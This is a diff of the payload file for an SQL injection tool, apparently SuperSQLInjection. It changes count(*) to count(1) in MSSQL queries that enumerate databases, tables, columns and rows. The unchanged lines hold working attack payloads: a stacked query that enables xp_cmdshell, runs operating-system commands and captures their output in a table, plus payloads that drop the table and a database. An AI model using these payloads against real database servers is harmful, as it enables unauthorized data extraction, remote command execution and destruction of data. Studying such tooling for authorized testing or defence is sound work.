@@ -13,13 +13,13 @@ namespace SuperSQLInjection.payload
 
 
         //数据库数量
-        public static String dbs_count = "(select count(*) from [master]..[sysdatabases])";
+        public static String dbs_count = "(select count(1) from [master]..[sysdatabases])";
         //表数量
-        public static String tables_count = "(select count(*) from [{dbname}]..[sysobjects] where xtype=0x55)";
+        public static String tables_count = "(select count(1) from [{dbname}]..[sysobjects] where xtype=0x55)";
         //列数量
-        public static String columns_count = "(select count(*) from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))";
+        public static String columns_count = "(select count(1) from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))";
         //获取数据条数
-        public static String data_count = "(select count(*) from [{dbname}]..[{table}])";
+        public static String data_count = "(select count(1) from [{dbname}]..[{table}])";
 
 
         //获取数据库名
@@ -76,7 +76,7 @@ namespace SuperSQLInjection.payload
         //cmd
         public static String createTableAndExecCmd = " 1=1;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
         public static String cmdData = "cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))";
-        public static String cmdDataCount = "(select (select count(*) from ssqlinjection))";
+        public static String cmdDataCount = "(select (select count(1) from ssqlinjection))";
         public static String dropTable = " 1=1;drop table ssqlinjection;select 1 where 1=1 ";
 
         public static String dropWriteFileBackUpTableAndDropDB = " 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 ";
